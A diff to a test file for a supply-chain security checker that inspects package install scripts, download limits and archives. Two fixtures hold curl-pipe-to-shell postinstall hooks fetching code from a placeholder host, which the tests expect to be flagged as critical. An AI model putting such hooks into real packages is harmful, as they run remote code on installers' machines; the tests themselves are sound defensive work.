@@ -123,25 +123,75 @@ def test_missing_typo_name_says_what_was_meant():
 
 
 def test_no_code_mode_uses_registry_scripts():
-    pkgs = package("hooky", {"setup.py": ""}, install_scripts={"postinstall": "node x.js"})
+    pkgs = package("hooky", {"setup.py": ""}, scripts={"postinstall": "node x.js"})
     registry = FakeRegistry(pkgs)
     report = Checker(registry, FakeOSV(), read_code=False).check(PackageSpec("pypi", "hooky"))
     assert [f.rule for f in report.verdict.findings] == ["install-script"]
     assert registry.downloads == []
 
 
-def test_too_big_to_download():
+def test_no_code_mode_still_reads_what_the_hooks_do():
+    pkgs = package("hooky", {}, scripts={"postinstall": "npm run go",
+                                         "go": "curl -s https://x.example/a.sh | sh"})
+    report = Checker(FakeRegistry(pkgs), FakeOSV(), read_code=False).check(
+        PackageSpec("pypi", "hooky"))
+    assert report.verdict.severity == "critical"
+    assert "download-exec" in {f.rule for f in report.verdict.findings}
+
+
+def test_too_big_to_download_is_incomplete_not_clean():
     pkgs = package("huge", {"setup.py": ""})
     pkgs["huge"][0].artifacts[0] = Artifact("huge-1.0.tar.gz", "https://f/h", 10**9)
     report = Checker(FakeRegistry(pkgs), FakeOSV()).check(PackageSpec("pypi", "huge"))
-    assert any("too big to read" in n for n in report.verdict.notes)
+    assert report.incomplete and "download limit" in report.incomplete[0]
 
 
-def test_broken_download_is_noted():
+def test_download_that_turns_out_too_big_is_incomplete():
+    class Huge(FakeRegistry):
+        def download(self, artifact, max_bytes=None):
+            raise http.TooBig("over the limit")
+
+    pkgs = package("sneaky", {"setup.py": ""})
+    pkgs["sneaky"][0].artifacts[0] = Artifact("sneaky-1.0.tar.gz", "https://f/s")
+    report = Checker(Huge(pkgs), FakeOSV()).check(PackageSpec("pypi", "sneaky"))
+    assert "download limit" in report.incomplete[0]
+
+
+def test_failed_download_is_incomplete():
+    class Down(FakeRegistry):
+        def download(self, artifact, max_bytes=None):
+            raise http.FetchError("connection reset")
+
+    report = Checker(Down(package("gone", {"setup.py": ""})), FakeOSV()).check(
+        PackageSpec("pypi", "gone"))
+    assert report.incomplete[0].startswith("couldn't download gone-1.0.tar.gz")
+
+
+def test_archive_that_cant_be_unpacked_is_a_finding():
     pkgs = package("broken", {"setup.py": ""})
     pkgs["broken"][1]["broken-1.0.tar.gz"] = b"not an archive"
     report = Checker(FakeRegistry(pkgs), FakeOSV()).check(PackageSpec("pypi", "broken"))
-    assert any("couldn't read broken-1.0.tar.gz" in n for n in report.verdict.notes)
+    assert [f.rule for f in report.verdict.findings] == ["unread-code"]
+    assert report.verdict.findings[0].path == "broken-1.0.tar.gz"
+    assert report.verdict.severity == "medium"
+
+
+def test_npm_tarballs_are_read_the_way_npm_installs_them():
+    # npm drops the first folder whatever its name, and the last copy wins.
+    data = tarball({"package/package.json": '{"name": "x"}',
+                    "zzz/package.json": '{"scripts": {"postinstall": "curl x.example | sh"}}'})
+    info = PackageInfo(ecosystem="npm", name="x", version="1.0.0", created=OLD, released=OLD,
+                       repository="https://github.com/x/y",
+                       artifacts=[Artifact("x-1.0.0.tgz", "https://f/x")])
+    report = Checker(FakeRegistry({"x": (info, {"x-1.0.0.tgz": data})}), FakeOSV()).check(
+        PackageSpec("npm", "x"))
+    assert "download-exec" in {f.rule for f in report.verdict.findings}
+
+
+def test_deprecated_releases_are_noted():
+    pkgs = package("old", {"setup.py": ""}, deprecated="yanked: broken build")
+    report = Checker(FakeRegistry(pkgs), FakeOSV()).check(PackageSpec("pypi", "old"))
+    assert any("yanked: broken build" in n for n in report.verdict.notes)
 
 
 def test_registry_errors_are_reported():
